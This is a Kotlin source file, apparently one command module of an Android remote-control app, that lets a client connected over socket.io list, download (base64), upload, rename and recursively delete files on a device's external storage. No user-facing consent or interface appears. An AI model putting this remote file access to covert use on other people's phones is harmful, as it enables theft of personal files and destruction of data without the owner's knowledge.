package com.remote.system

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.os.Environment
import android.provider.Settings
import android.util.Base64
import android.util.Log
import androidx.core.content.ContextCompat
import org.json.JSONArray
import org.json.JSONException
import org.json.JSONObject
import io.socket.client.Socket
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.*

class FileManagerCommand(private val context: Context) : CommandHandler {
    private val tag = "FileManagerCommand"

    override fun execute(params: JSONObject, clientId: String, socket: Socket) {
        val action = params.optString("action", "list")
        
        when (action) {
            "list" -> listFiles(params, clientId, socket)
            "download" -> downloadFile(params, clientId, socket)
            "upload" -> uploadFile(params, clientId, socket)
            "delete" -> deleteFile(params, clientId, socket)
            "rename" -> renameFile(params, clientId, socket)
            "create_folder" -> createFolder(params, clientId, socket)
            else -> sendErrorResponse("Unknown action: $action", clientId, socket)
        }
    }

    private fun listFiles(params: JSONObject, clientId: String, socket: Socket) {
        if (!checkStoragePermissions()) {
            sendErrorResponse("Storage permissions not granted", clientId, socket)
            return
        }

        try {
            val path = params.optString("path", Environment.getExternalStorageDirectory().absolutePath)
            val directory = File(path)

            if (!directory.exists() || !directory.isDirectory) {
                sendErrorResponse("Directory does not exist: $path", clientId, socket)
                return
            }

            val response = JSONObject()
            val data = JSONObject()
            val filesArray = JSONArray()

            // Add parent directory entry if not root
            if (directory.parent != null) {
                val parentObj = JSONObject()
                parentObj.put("name", "..")
                parentObj.put("type", "directory")
                parentObj.put("path", directory.parent)
                parentObj.put("size", 0)
                parentObj.put("modified", 0)
                filesArray.put(parentObj)
            }

            // List directory contents
            directory.listFiles()?.sortedWith(compareBy<File> { !it.isDirectory }.thenBy { it.name })?.forEach { file ->
                val fileObj = JSONObject()
                fileObj.put("name", file.name)
                fileObj.put("type", if (file.isDirectory) "directory" else "file")
                fileObj.put("path", file.absolutePath)
                fileObj.put("size", if (file.isFile) file.length() else 0)
                fileObj.put("modified", file.lastModified())
                fileObj.put("readable", file.canRead())
                fileObj.put("writable", file.canWrite())
                
                // Add file extension for files
                if (file.isFile) {
                    fileObj.put("extension", file.extension)
                }

                filesArray.put(fileObj)
            }

            data.put("files", filesArray)
            data.put("currentPath", directory.absolutePath)
            data.put("count", filesArray.length())

            response.put("success", true)
            response.put("data", data)
            response.put("command", "file_manager")
            response.put("action", "list")
            response.put("clientId", clientId)

            socket.emit("command-response", response)
            Log.d(tag, "File list sent successfully: ${filesArray.length()} items")

        } catch (e: Exception) {
            Log.e(tag, "Error listing files", e)
            sendErrorResponse("Failed to list files: ${e.message}", clientId, socket)
        }
    }

    private fun downloadFile(params: JSONObject, clientId: String, socket: Socket) {
        if (!checkStoragePermissions()) {
            sendErrorResponse("Storage permissions not granted", clientId, socket)
            return
        }

        try {
            val filePath = params.optString("path")
            val file = File(filePath)

            if (!file.exists() || !file.isFile) {
                sendErrorResponse("File does not exist: $filePath", clientId, socket)
                return
            }

            if (!file.canRead()) {
                sendErrorResponse("Cannot read file: $filePath", clientId, socket)
                return
            }

            // Limit file size to 10MB for downloads
            if (file.length() > 10 * 1024 * 1024) {
                sendErrorResponse("File too large (max 10MB): $filePath", clientId, socket)
                return
            }

            val fileBytes = FileInputStream(file).use { it.readBytes() }
            val base64Data = Base64.encodeToString(fileBytes, Base64.DEFAULT)

            val response = JSONObject()
            val data = JSONObject()
            data.put("fileName", file.name)
            data.put("filePath", file.absolutePath)
            data.put("fileSize", file.length())
            data.put("fileData", base64Data)
            data.put("mimeType", getMimeType(file.extension))

            response.put("success", true)
            response.put("data", data)
            response.put("command", "file_manager")
            response.put("action", "download")
            response.put("clientId", clientId)

            socket.emit("command-response", response)
            Log.d(tag, "File downloaded successfully: ${file.name}")

        } catch (e: Exception) {
            Log.e(tag, "Error downloading file", e)
            sendErrorResponse("Failed to download file: ${e.message}", clientId, socket)
        }
    }

    private fun uploadFile(params: JSONObject, clientId: String, socket: Socket) {
        if (!checkStoragePermissions()) {
            sendErrorResponse("Storage permissions not granted", clientId, socket)
            return
        }

        try {
            val fileName = params.optString("fileName")
            val targetPath = params.optString("targetPath")
            val base64Data = params.optString("fileData")

            if (fileName.isEmpty() || targetPath.isEmpty() || base64Data.isEmpty()) {
                sendErrorResponse("Missing required parameters for upload", clientId, socket)
                return
            }

            val targetDir = File(targetPath)
            if (!targetDir.exists() || !targetDir.isDirectory) {
                sendErrorResponse("Target directory does not exist: $targetPath", clientId, socket)
                return
            }

            val targetFile = File(targetDir, fileName)
            val fileBytes = Base64.decode(base64Data, Base64.DEFAULT)

            FileOutputStream(targetFile).use { it.write(fileBytes) }

            val response = JSONObject()
            val data = JSONObject()
            data.put("fileName", fileName)
            data.put("filePath", targetFile.absolutePath)
            data.put("fileSize", targetFile.length())

            response.put("success", true)
            response.put("data", data)
            response.put("command", "file_manager")
            response.put("action", "upload")
            response.put("clientId", clientId)

            socket.emit("command-response", response)
            Log.d(tag, "File uploaded successfully: $fileName")

        } catch (e: Exception) {
            Log.e(tag, "Error uploading file", e)
            sendErrorResponse("Failed to upload file: ${e.message}", clientId, socket)
        }
    }

    private fun deleteFile(params: JSONObject, clientId: String, socket: Socket) {
        if (!checkStoragePermissions()) {
            sendErrorResponse("Storage permissions not granted", clientId, socket)
            return
        }

        try {
            val filePath = params.optString("path")
            val file = File(filePath)

            if (!file.exists()) {
                sendErrorResponse("File does not exist: $filePath", clientId, socket)
                return
            }

            val deleted = if (file.isDirectory) {
                deleteRecursively(file)
            } else {
                file.delete()
            }

            val response = JSONObject()
            val data = JSONObject()
            data.put("filePath", filePath)
            data.put("deleted", deleted)

            response.put("success", deleted)
            response.put("data", data)
            response.put("command", "file_manager")
            response.put("action", "delete")
            response.put("clientId", clientId)

            if (!deleted) {
                response.put("error", "Failed to delete file/directory")
            }

            socket.emit("command-response", response)
            Log.d(tag, "Delete operation completed: $filePath, success: $deleted")

        } catch (e: Exception) {
            Log.e(tag, "Error deleting file", e)
            sendErrorResponse("Failed to delete file: ${e.message}", clientId, socket)
        }
    }

    private fun renameFile(params: JSONObject, clientId: String, socket: Socket) {
        if (!checkStoragePermissions()) {
            sendErrorResponse("Storage permissions not granted", clientId, socket)
            return
        }

        try {
            val oldPath = params.optString("oldPath")
            val newName = params.optString("newName")

            val oldFile = File(oldPath)
            if (!oldFile.exists()) {
                sendErrorResponse("File does not exist: $oldPath", clientId, socket)
                return
            }

            val newFile = File(oldFile.parent, newName)
            val renamed = oldFile.renameTo(newFile)

            val response = JSONObject()
            val data = JSONObject()
            data.put("oldPath", oldPath)
            data.put("newPath", newFile.absolutePath)
            data.put("renamed", renamed)

            response.put("success", renamed)
            response.put("data", data)
            response.put("command", "file_manager")
            response.put("action", "rename")
            response.put("clientId", clientId)

            if (!renamed) {
                response.put("error", "Failed to rename file")
            }

            socket.emit("command-response", response)
            Log.d(tag, "Rename operation completed: $oldPath -> $newName, success: $renamed")

        } catch (e: Exception) {
            Log.e(tag, "Error renaming file", e)
            sendErrorResponse("Failed to rename file: ${e.message}", clientId, socket)
        }
    }

    private fun createFolder(params: JSONObject, clientId: String, socket: Socket) {
        if (!checkStoragePermissions()) {
            sendErrorResponse("Storage permissions not granted", clientId, socket)
            return
        }

        try {
            val parentPath = params.optString("parentPath")
            val folderName = params.optString("folderName")

            val parentDir = File(parentPath)
            if (!parentDir.exists() || !parentDir.isDirectory) {
                sendErrorResponse("Parent directory does not exist: $parentPath", clientId, socket)
                return
            }

            val newFolder = File(parentDir, folderName)
            val created = newFolder.mkdirs()

            val response = JSONObject()
            val data = JSONObject()
            data.put("folderPath", newFolder.absolutePath)
            data.put("created", created)

            response.put("success", created)
            response.put("data", data)
            response.put("command", "file_manager")
            response.put("action", "create_folder")
            response.put("clientId", clientId)

            if (!created) {
                response.put("error", "Failed to create folder")
            }

            socket.emit("command-response", response)
            Log.d(tag, "Create folder operation completed: $folderName, success: $created")

        } catch (e: Exception) {
            Log.e(tag, "Error creating folder", e)
            sendErrorResponse("Failed to create folder: ${e.message}", clientId, socket)
        }
    }

    private fun checkStoragePermissions(): Boolean {
        // For Android 11+ check MANAGE_EXTERNAL_STORAGE
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            return Environment.isExternalStorageManager()
        }
        
        // For older versions check READ/WRITE_EXTERNAL_STORAGE
        return ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE) == 
               PackageManager.PERMISSION_GRANTED &&
               ContextCompat.checkSelfPermission(context, Manifest.permission.WRITE_EXTERNAL_STORAGE) == 
               PackageManager.PERMISSION_GRANTED
    }

    private fun deleteRecursively(file: File): Boolean {
        if (file.isDirectory) {
            file.listFiles()?.forEach { child ->
                if (!deleteRecursively(child)) {
                    return false
                }
            }
        }
        return file.delete()
    }

    private fun getMimeType(extension: String): String {
        return when (extension.lowercase()) {
            "jpg", "jpeg" -> "image/jpeg"
            "png" -> "image/png"
            "gif" -> "image/gif"
            "pdf" -> "application/pdf"
            "txt" -> "text/plain"
            "mp3" -> "audio/mpeg"
            "mp4" -> "video/mp4"
            "zip" -> "application/zip"
            else -> "application/octet-stream"
        }
    }

    private fun sendErrorResponse(error: String, clientId: String, socket: Socket) {
        try {
            val errorResponse = JSONObject()
            errorResponse.put("success", false)
            errorResponse.put("error", error)
            errorResponse.put("command", "file_manager")
            errorResponse.put("clientId", clientId)
            socket.emit("command-response", errorResponse)
        } catch (e: JSONException) {
            Log.e(tag, "Error sending error response", e)
        }
    }
}
